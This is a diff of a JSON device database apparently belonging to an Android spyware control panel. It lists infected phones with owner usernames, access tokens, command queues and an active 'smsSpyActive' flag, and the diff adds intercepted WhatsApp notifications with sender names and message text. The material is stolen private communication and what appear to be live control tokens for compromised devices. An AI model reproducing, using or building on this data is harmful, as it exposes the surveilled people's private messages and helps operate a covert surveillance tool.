@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776843155280,
+    "lastSeen": 1776843161264,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎98 pesan dari 2 chat",
+        "time": "22/04 15:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843163395
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎Pegasus-X Room (25 pesan): ~ Aufatzy",
+        "content": "Takut nya sesat🤭🙏",
+        "time": "22/04 15:32",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776843163209
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -1709,7 +1725,7 @@
     "deviceName": "TECNO LE7",
     "ownerUsername": "Zal7Sex",
     "token": "2d52258cb0a11a890ba41fac54cda5a3",
-    "lastSeen": 1776843152547,
+    "lastSeen": 1776843161690,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:30:01.375Z",
